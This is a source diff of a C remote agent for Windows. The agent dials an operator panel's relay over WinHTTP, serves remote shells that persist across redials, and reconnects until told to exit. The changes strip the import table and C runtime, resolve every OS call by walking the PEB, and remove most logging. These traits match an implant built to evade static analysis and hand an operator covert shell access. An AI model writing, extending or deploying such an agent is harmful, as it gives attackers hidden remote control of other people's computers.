@@ -1,4 +1,4 @@
-/* relay_client - a minimal agent for Windows (WinHTTP, 8+).
+/* minimal_agent - a minimal agent for Windows (WinHTTP, 8+).
  *
  * A "minimal agent" in the relay protocol is anything that answers the
  * operator panel's Hello command with a 750-byte identity frame. Everything
@@ -19,15 +19,27 @@
  *               Only the Exit command (or killing the process) ends it;
  *               live shells survive a redial.
  *
- * Build (MinGW gcc) - no -lwinhttp: every WinHTTP call is resolved at
- * runtime from the PEB (winhttp_api.c):
- *   gcc -O2 -s -Wall -Wextra -o relay_client.exe main.c \
- *       transport.c shell.c report.c system_facts.c winhttp_api.c \
- *       memory.c string.c kernel32.c advapi.c ntdll.c peb.c \
- *       system.c djb2.c logger.c -ladvapi32
+ * Build - the single flavor is DEPENDENCY-FREE: no CRT, no import table,
+ * no -lwinhttp. Every OS call (WinHTTP included) is resolved at runtime
+ * from the PEB; the process starts at our own entry (entry.c), not the
+ * CRT startup. Two steps - compile, then link:
+ *
+ *   gcc -O2 -c main.c transport.c shell.c report.c system_facts.c \
+ *       winhttp_api.c memory.c string.c kernel32.c advapi.c ntdll.c \
+ *       peb.c system.c djb2.c logger.c entry.c freestanding.c
+ *   gcc -O2 -s -nostdlib -e entry -o minimal_agent.exe \
+ *       entry.o main.o transport.o shell.o report.o system_facts.o \
+ *       winhttp_api.o memory.o string.o kernel32.o advapi.o ntdll.o \
+ *       peb.o system.o djb2.o logger.o freestanding.o
+ *
+ * (entry.c MUST be in the object list and -e entry names the real entry
+ *  point - omitting either leaves ___chkstk_ms unresolved or the entry
+ *  address pointing at the wrong symbol. Verify with:
+ *  objdump -f minimal_agent.exe | grep "start address" vs nm entry)
+ *
  * Run:
- *   relay_client.exe <URL>        e.g. ... https://relay.example.com/agent
- *   relay_client.exe <URL> -v     verbose: dump every command's raw bytes
+ *   minimal_agent.exe <URL>        e.g. ... https://relay.example.com/agent
+ *   minimal_agent.exe <URL> -v     verbose: dump every command's raw bytes
  *
  * The URL comes only from the command line; nothing is hardcoded.
  *
@@ -57,6 +69,7 @@
 #include "memory.h"
 #include "logger.h"
 #include "kernel32.h"
+#include "entry.h"      /* agent_main: the -nostdlib entry contract */
 
 
 /* Commit tag baked into the identity frame. CI overrides it with
@@ -255,28 +268,38 @@ static DWORD handle_close_shell(HINTERNET socket, const incoming_message *msg)
 /* One full connect/serve/close session (defined below main). */
 static int run_session(const WCHAR *url, int *long_lived);
 
-int main(int argc, CHAR *argv[])
+INT32 agent_main(INT32 argc, CHAR *argv[])
 {
-    LOG_INFO("Minimal agent starting (commit %s)\n", AGENT_COMMIT_HASH);
     KERNEL32 kernel;
     if (!KERNEL32_Ctor(&kernel)) {
         LOG_ERROR("Failed to load kernel32.dll\n");
     }
-    LOG_INFO("Kernel is initialized\n");
-    /* ----- Stage 1: the URL must come from the command line ----- */
-    if (argc == 3 && Compare(argv[2], "-v") == 0)
-        verbose = 1;
-    else if (argc != 2) {
-        LOG_ERROR("Usage: %s <URL> [-v]\n", argv[0]);
+   
+    const CHAR *url_arg = NULL;
+    int start = (argc >= 2) ? 1 : 0;
+    for (int i = start; i < argc; i++) {
+        if (strcmp(argv[i], "-v") == 0) {
+            verbose = 1;
+            continue;
+        }
+        if (url_arg == NULL)
+            url_arg = argv[i];
+    }
+
+    if (url_arg == NULL && argc == 1 && argv[0] != NULL && strcmp(argv[0], "-v") != 0)
+        url_arg = argv[0];
+
+    if (url_arg == NULL) {
+        const CHAR *prog = (argc > 0 && argv[0]) ? argv[0] : "minimal_agent.exe";
+        LOG_ERROR("Usage: %s <URL> [-v]\n", prog);
         return 1;
     }
 
-    WCHAR url[2048];
-    if (AnsiToWide(argv[1], url, 2048) == -1) {
+    static WCHAR url[2048];
+    if (AnsiToWide(url_arg, url, 2048) == -1) {
         LOG_ERROR("AnsiToWide(URL) failed\n");
         return 1;
     }
-    LOG_INFO("URL: %ls\n", url);
 
     /* ----- The agent loop: dial, serve, redial. A lost connection is a
      * normal event (the relay drops agent sockets when the paired operator
@@ -287,7 +310,6 @@ int main(int argc, CHAR *argv[])
      * ids after the panel re-opens. */
     int rc = RC_SESSION_LOST;
     while (rc == RC_SESSION_LOST) {
-        LOG_INFO("Dialing %ls ...\n", url);
         int long_lived = 0;
         rc = run_session(url, &long_lived);
         if (rc == RC_SESSION_LOST) {
@@ -309,7 +331,6 @@ int main(int argc, CHAR *argv[])
             kernel.Sleep((DWORD)wait_s * 1000);
         }
     }
-    LOG_INFO("Agent exiting (rc = %d)\n", rc);
     return rc;
 }
 
@@ -321,12 +342,10 @@ int main(int argc, CHAR *argv[])
 static int run_session(const WCHAR *url, int *long_lived)
 {
     /* Resource state for correct cleanup via goto. */
-    int       rc = RC_SESSION_LOST;     /* default: dial again          */
+    int rc = RC_SESSION_LOST;     /* default: dial again          */
     HINTERNET session = NULL, connection = NULL, request = NULL;
     HINTERNET socket = NULL;
     KERNEL32 kernel32;
-
-    LOG_INFO("[1] Session start: connect, upgrade, serve commands, cleanup ...\n");
     if (!KERNEL32_Ctor(&kernel32)) {
         LOG_ERROR("Failed to load kernel32.dll\n");
     }
@@ -344,13 +363,11 @@ static int run_session(const WCHAR *url, int *long_lived)
 
     /* ----- Stage 2: split the URL into components (WinHttpCrackUrl) ----- */
     URL_COMPONENTS uc;
-    LOG_INFO("Cracking URL %ls ...\n", url);
     MemoryZero(&uc, sizeof(uc));
-    LOG_INFO("URL_COMPONENTS struct size = %zu\n", sizeof(uc));
     uc.dwStructSize = sizeof(uc);
 
-    WCHAR host[256];
-    WCHAR path[2048];
+    static WCHAR host[256];
+    static WCHAR path[2048];
     uc.lpszHostName    = host;  uc.dwHostNameLength = 256;
     uc.lpszUrlPath     = path;  uc.dwUrlPathLength  = 2048;
 
@@ -377,7 +394,7 @@ static int run_session(const WCHAR *url, int *long_lived)
            https ? L"https" : L"http", uc.lpszHostName, uc.lpszUrlPath);
     
 
-    session = winhttp.WinHttpOpen(L"relay_client/1.0",
+    session = winhttp.WinHttpOpen(L"minimal_agent/1.0",
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!session) { LOG_ERROR("WinHttpOpen failed: %lu\n", kernel32.GetLastError()); goto cleanup; }
@@ -427,7 +444,7 @@ static int run_session(const WCHAR *url, int *long_lived)
     LOG_INFO("[2] Agent mode: replying to commands (capability mask = Shell)...\n");
     for (int index = 1; ; index++) {
         *long_lived = 1;                /* a command arrived on this wire */
-        incoming_message msg;
+        static incoming_message msg;
         BOOL closed = FALSE;
 
         DWORD err = ws_receive(socket, &msg, &closed);
